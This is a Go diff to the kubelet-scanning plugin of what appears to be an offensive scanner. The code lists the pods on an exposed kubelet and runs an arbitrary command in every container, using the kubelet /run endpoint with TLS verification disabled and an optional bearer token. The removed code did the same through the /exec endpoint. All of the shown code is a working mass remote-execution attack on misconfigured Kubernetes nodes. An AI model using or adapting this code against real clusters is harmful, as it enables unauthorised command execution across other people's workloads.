@@ -1,9 +1,10 @@
 package plugins
 
 import (
+	"bytes"
 	"crypto/tls"
-	"encoding/base64"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"net/url"
@@ -13,6 +14,7 @@ import (
 	"github.com/404tk/lazyscan/common"
 	"github.com/404tk/lazyscan/pkg/schema"
 	"github.com/tidwall/gjson"
+	"golang.org/x/net/http2"
 )
 
 func KubeletScan(info *common.HostInfo) bool {
@@ -55,8 +57,6 @@ func KubeletScan(info *common.HostInfo) bool {
 	}
 	// batch command execution
 	if cmd != "" {
-		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
-		urlecd := url.QueryEscape(b64)
 		for _, item := range pods {
 			pod := item.Get("metadata.name").String()
 			namespace := item.Get("metadata.namespace").String()
@@ -67,19 +67,54 @@ func KubeletScan(info *common.HostInfo) bool {
 			containers := item.Get("spec.containers").Array()
 			for _, c := range containers {
 				// 批量pods执行时忽略报错
+				// api := fmt.Sprintf(opts.Endpoint+
+				// "/exec/%s/%s/%s?command=/bin/sh&command=-c&command=%s&error=1&output=1",
+				// namespace, pod, c.Get("name").String(), urlecd)
 				api := fmt.Sprintf(opts.Endpoint+
-					"/exec/%s/%s/%s?command=/bin/sh&command=-c&command=%s&error=1&output=1",
-					namespace, pod, c.Get("name").String(), urlecd)
-				flag := kubeletExec(info, api)
-				if !flag {
-					return false
-				}
+					"/run/%s/%s/%s", namespace, pod, c.Get("name").String())
+				kubeletExec(info, api, url.QueryEscape(cmd))
 			}
 		}
 	}
 	return true
 }
 
+func kubeletExec(info *common.HostInfo, api, cmd string) bool {
+	httpclient := &http.Client{
+		Transport: &http2.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+		Timeout: time.Second * 20,
+	}
+	req, err := http.NewRequest("POST", api, bytes.NewBuffer([]byte("cmd="+cmd)))
+	if err != nil {
+		return false
+	}
+	if info.Token != "" {
+		req.Header.Add("Authorization", "Bearer "+strings.TrimSuffix(info.Token, "\n"))
+	}
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := httpclient.Do(req)
+	if err != nil {
+		return false
+	}
+	raw, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false
+	}
+	if resp.StatusCode == http.StatusOK {
+		if info.Command != "" {
+			fmt.Println(api)
+			fmt.Println(string(raw))
+		}
+		return true
+	}
+	return false
+}
+
+// Use API /exec/
+/*
 func kubeletExec(info *common.HostInfo, api string) bool {
 	httpclient := &http.Client{
 		Transport: &http.Transport{
@@ -103,9 +138,16 @@ func kubeletExec(info *common.HostInfo, api string) bool {
 	if err != nil {
 		return false
 	}
-
+	raw, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false
+	}
 	if resp.StatusCode == http.StatusSwitchingProtocols {
+		if info.Command != "" {
+			fmt.Println(string(raw))
+		}
 		return true
 	}
 	return false
 }
+*/
